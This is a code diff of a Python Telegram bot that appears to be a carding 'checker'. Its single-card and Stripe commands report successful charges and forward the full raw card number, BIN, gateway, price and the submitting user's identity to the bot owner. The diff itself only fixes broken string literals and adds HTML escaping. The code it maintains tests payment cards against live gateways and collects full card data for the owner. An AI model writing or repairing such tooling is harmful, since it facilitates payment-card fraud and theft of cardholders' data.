@@ -182,24 +182,16 @@ async def single_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 ctx.bot,
                 chat_id=owner_id,
                 text=(
-                    f"🤍 CHARGED (Single) 🤍
+                    f"🤍 CHARGED (Single) 🤍\n\n"
 
-"
-                    f"💳 CC : {html.escape(card.raw)}
-"
-                    f"🛒 Gateway : {html.escape(result.gateway)}
-"
-                    f"📝 Response : {html.escape(result.message)}
-"
-                    f"💵 Price : ${result.price}
-"
-                    f"🏪 Store : {html.escape(result.store)}
-"
-                    f"👤 User : {user.id} ({html.escape(user.username or '')})
+                    f"💳 CC : {html.escape(card.raw)}\n"
+                    f"🛒 Gateway : {html.escape(result.gateway)}\n"
+                    f"📝 Response : {html.escape(result.message)}\n"
+                    f"💵 Price : ${result.price}\n"
+                    f"🏪 Store : {html.escape(result.store)}\n"
+                    f"👤 User : {user.id} ({html.escape(user.username or '')})\n\n"
 
-"
-                    f"💳 BIN: {card.bin}
-"
+                    f"💳 BIN: {card.bin}\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━"
                 ),
                 parse_mode=ParseMode.HTML,
@@ -333,11 +325,11 @@ async def stripe_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 chat_id=owner_id,
                 text=(
                     f"🤍 CHARGED (Stripe) 🤍\n\n"
-                    f"💳 CC : {card.raw}\n"
-                    f"🛒 Gateway : {result.gateway}\n"
-                    f"📝 Response : {result.message}\n"
+                    f"💳 CC : {html.escape(card.raw)}\n"
+                    f"🛒 Gateway : {html.escape(result.gateway)}\n"
+                    f"📝 Response : {html.escape(result.message)}\n"
                     f"💵 Price : ${result.price}\n"
-                    f"👤 User : {user.id} ({user.username})\n\n"
+                    f"👤 User : {user.id} ({html.escape(user.username or '')})\n\n"
                     f"💳 BIN: {card.bin}\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━"
                 ),
